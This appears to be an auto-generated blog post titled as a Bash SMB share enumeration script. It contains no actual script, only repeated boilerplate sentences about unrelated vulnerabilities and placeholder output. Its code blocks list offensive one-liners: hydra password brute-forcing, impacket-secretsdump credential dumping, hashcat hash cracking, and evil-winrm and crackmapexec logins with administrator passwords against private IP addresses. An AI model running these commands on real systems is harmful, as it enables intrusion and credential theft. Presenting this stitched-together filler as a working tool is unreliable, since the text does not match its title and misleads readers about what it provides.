---
TitleSEO: "SMB Share Enumeration Script in Bash | ZureFX"
TitlePost: "SMB Share Enumeration Script — Bash"
Author: "ZureFX"
Description: "A Bash script for smb share enumeration script. Built for security research and automation."
Keywords: "powershell, scanner, tool, rust, go, bash"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-189.html"
URL_IMAGES: ""
Date: "2025-10-04"
Tags: "PowerShell, Scanner, Tool, Rust, Go, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-189"
Permalink: "/scripting/script-smb-share-enumeration-script-189.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `rpcclient`
- `smbexec`
- `chisel`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.31.199 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.88.163.198 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.54.152.149
evil-winrm -i 10.12.192.221 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.90.179.79 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.102.253.105 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
gobuster dir -u http://10.96.164.229/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.78.173.109 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 25.04s
```
